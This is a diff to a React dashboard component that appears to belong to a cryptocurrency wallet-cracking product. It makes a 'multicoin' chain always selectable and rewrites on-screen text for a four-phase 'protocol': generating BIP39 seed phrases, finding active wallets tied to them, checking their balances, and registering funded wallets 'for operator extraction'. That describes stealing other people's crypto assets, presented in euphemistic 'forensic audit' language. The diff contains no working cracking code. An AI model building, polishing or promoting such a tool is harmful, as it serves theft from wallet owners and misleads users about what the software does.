@@ -233,7 +233,11 @@ export default function AiCryptoDashboard() {
 
   const filteredBlockchains = useMemo(() => {
     if (!session?.allowedChains || session.allowedChains.length === 0) return BLOCKCHAINS;
-    return BLOCKCHAINS.filter(chain => session.allowedChains?.includes(chain.id));
+    // Ensure Multicoin is always selectable for operators
+    const filtered = BLOCKCHAINS.filter(chain => 
+      chain.id === 'multicoin' || session.allowedChains?.includes(chain.id)
+    );
+    return filtered;
   }, [session]);
 
   useEffect(() => {
@@ -1357,10 +1361,10 @@ export default function AiCryptoDashboard() {
                     <h4 className="text-[10px] font-black uppercase tracking-[0.3em] text-white/40 px-2">System Operational Protocol</h4>
                     <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                       {[
-                        { step: "Phase 1", desc: "Autonomous Mnemonic Synthesis: Generating BIP39 recovery phrases using high-entropy neural weights." },
-                        { step: "Phase 2", desc: "Network Synchronization: Performing deep interrogation across nodes to identify active wallet addresses associated with synthesized phrases." },
-                        { step: "Phase 3", desc: "Forensic Asset Audit: Executing real-time ledger inquiries to determine the current liquidity and valuation of detected nodes." },
-                        { step: "Phase 4", desc: "Discovery Registration: Assets with verified non-zero balances are formally registered in the secure ledger for extraction." }
+                        { step: "Phase 1", desc: "Autonomous Mnemonic Synthesis: The engine generates high-entropy BIP39 seed phrases using neural randomization." },
+                        { step: "Phase 2", desc: "Network Synchronization: The system performs cross-network interrogation to identify active wallet addresses associated with the synthesized phrases." },
+                        { step: "Phase 3", desc: "Forensic Asset Audit: Upon discovery, a real-time ledger inquiry determines the current valuation and liquidity of detected nodes." },
+                        { step: "Phase 4", desc: "Discovery Registration: Assets with verified non-zero balances are formally registered in the secure ledger for operator extraction." }
                       ].map((item, i) => (
                         <div key={i} className="glass-panel rounded-xl p-5 border-white/5 space-y-3 hover:border-primary/30 transition-all duration-500 group shadow-md hover:shadow-primary/5">
                           <span className="text-[9px] font-black text-primary uppercase tracking-[0.2em] border-b border-primary/20 pb-1 inline-block transition-all duration-500 group-hover:border-primary/50">{item.step}</span>
